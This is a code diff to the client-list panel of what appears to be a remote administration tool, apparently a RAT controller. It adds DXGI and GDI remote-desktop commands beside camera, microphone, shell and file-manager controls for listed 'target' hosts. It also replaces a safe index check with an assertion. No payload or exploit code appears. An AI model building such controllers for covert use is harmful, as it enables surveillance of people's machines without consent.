@@ -36,7 +36,6 @@ BEGIN_MESSAGE_MAP(CClientList, CListCtrl)
 	ON_COMMAND(ID_OPERATION_CMD, &CClientList::OnOperationCmd)
 	ON_COMMAND(ID_OPERATION_CHATBOX, &CClientList::OnOperationChatbox)
 	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CClientList::OnOperationFilemanager)
-	ON_COMMAND(ID_OPERATION_REMOTEDESKTOP, &CClientList::OnOperationRemotedesktop)
 	ON_COMMAND(ID_OPERATION_CAMERA, &CClientList::OnOperationCamera)
 	ON_COMMAND(ID_SESSION_RESTART, &CClientList::OnSessionRestart)
 	ON_COMMAND(ID_OPERATION_MICROPHONE, &CClientList::OnOperationMicrophone)
@@ -51,6 +50,8 @@ BEGIN_MESSAGE_MAP(CClientList, CListCtrl)
 	ON_COMMAND(ID_UTILS_OPENWEBPAGE, &CClientList::OnUtilsOpenwebpage)
 	ON_COMMAND(ID_OPERATION_PROCESSMANAGER, &CClientList::OnOperationProcessmanager)
 	ON_NOTIFY_REFLECT(LVN_COLUMNCLICK, &CClientList::OnLvnColumnclick)
+	ON_COMMAND(ID_REMOTEDESKTOP_DXGI, &CClientList::OnRemotedesktopDxgi)
+	ON_COMMAND(ID_REMOTEDESKTOP_GDI, &CClientList::OnRemotedesktopGdi)
 END_MESSAGE_MAP()
 
 
@@ -90,27 +91,28 @@ int CClientList::OnCreate(LPCREATESTRUCT lpCreateStruct)
 LRESULT CClientList::OnClientLogin(WPARAM wParam, LPARAM lParam)
 {
 	CKernelSrv*pHandler = (CKernelSrv*)wParam;
-	CKernelSrv::LoginInfo*pLoginInfo = (CKernelSrv::LoginInfo*)lParam;
+	LoginInfo*pLoginInfo = (LoginInfo*)lParam;
 	CString Text;
 	int idx = GetItemCount();
 
 	//显示目标主机信息
 	//IP
+
 	InsertItem(idx, pHandler->GetPublicIP());
 	//Private IP
-	SetItemText(idx, 1, pLoginInfo->szPrivateIP);
+	SetItemText(idx, 1, pLoginInfo->PrivateIP);
 	//Host
-	SetItemText(idx, 2, pLoginInfo->szHostName);
+	SetItemText(idx, 2, pLoginInfo->HostName);
 	
-	SetItemText(idx, 3, pLoginInfo->szUser);
+	SetItemText(idx, 3, pLoginInfo->User);
 
-	SetItemText(idx, 4, pLoginInfo->szOsName);
+	SetItemText(idx, 4, pLoginInfo->OsName);
 	
-	SetItemText(idx, 5, pLoginInfo->szInstallDate);
+	SetItemText(idx, 5, pLoginInfo->InstallDate);
 	
-	SetItemText(idx, 6, pLoginInfo->szCPU);
+	SetItemText(idx, 6, pLoginInfo->CPU);
 	
-	SetItemText(idx, 7, pLoginInfo->szDisk_RAM);
+	SetItemText(idx, 7, pLoginInfo->Disk_RAM);
 
 	//Camera
 	Text.Format(TEXT("%d"), pLoginInfo->dwHasCamera);
@@ -126,7 +128,7 @@ LRESULT CClientList::OnClientLogin(WPARAM wParam, LPARAM lParam)
 
 	SetItemText(idx, 10, pHandler->GetLocation());
 	//Comment
-	SetItemText(idx, 11, pLoginInfo->szComment);
+	SetItemText(idx, 11, pLoginInfo->Comment);
 	//
 	SetItemText(idx, 12, TEXT(""));
 	//保存Handler
@@ -144,15 +146,11 @@ LRESULT CClientList::OnClientLogout(WPARAM wParam, LPARAM lParam)
 	int index = FindItem(&fi);
 
 	//client 未加入login info 就退出,就会导致index < 0,不影响.
-	//ASSERT(index >= 0);
+	ASSERT(index >= 0);
 	
-	if (index >= 0)
-	{
-		DeleteItem(index);
-	}
+	DeleteItem(index);
 	pHandler->Close();
 	pHandler->Put();
-
 	return 0;
 }
 
@@ -209,8 +207,14 @@ LRESULT CClientList::OnEditComment(WPARAM wParam, LPARAM lParam)
 
 LRESULT CClientList::OnKernelError(WPARAM error, LPARAM lParam)
 {
-	CString IP =(TCHAR*)lParam;
-	MessageBox((TCHAR*)error, IP, MB_ICONWARNING | MB_OK);
+	CHAR szIP[64];
+	CString Title;
+	CKernelSrv* kernel =(CKernelSrv*)lParam;
+	kernel->GetPeerAddress(szIP);
+
+	Title.Format(TEXT("[%s]"), CString(szIP));
+
+	MessageBox((TCHAR*)error, Title, MB_ICONWARNING | MB_OK);
 	return 0;
 }
 
@@ -318,18 +322,6 @@ void CClientList::OnOperationFilemanager()
 		int CurSelIdx = GetNextSelectedItem(pos);
 		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
 		pHandler->BeginFileMgr();
-	}
-}
-
-
-void CClientList::OnOperationRemotedesktop()
-{
-	POSITION pos = GetFirstSelectedItemPosition();
-	while (pos)
-	{
-		int CurSelIdx = GetNextSelectedItem(pos);
-		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
-		pHandler->BeginRemoteDesktop();
 	}
 }
 
@@ -521,4 +513,28 @@ void CClientList::OnLvnColumnclick(NMHDR *pNMHDR, LRESULT *pResult)
 	m_sortCol = pNMLV->iSubItem;
 	SortItemsEx(CompareByString,(DWORD_PTR)this);
 	return;
+}
+
+
+void CClientList::OnRemotedesktopDxgi()
+{
+	POSITION pos = GetFirstSelectedItemPosition();
+	while (pos)
+	{
+		int CurSelIdx = GetNextSelectedItem(pos);
+		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
+		pHandler->BeginRemoteDesktop_dxgi();
+	}
+}
+
+
+void CClientList::OnRemotedesktopGdi()
+{
+	POSITION pos = GetFirstSelectedItemPosition();
+	while (pos)
+	{
+		int CurSelIdx = GetNextSelectedItem(pos);
+		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
+		pHandler->BeginRemoteDesktop_gdi();
+	}
 }
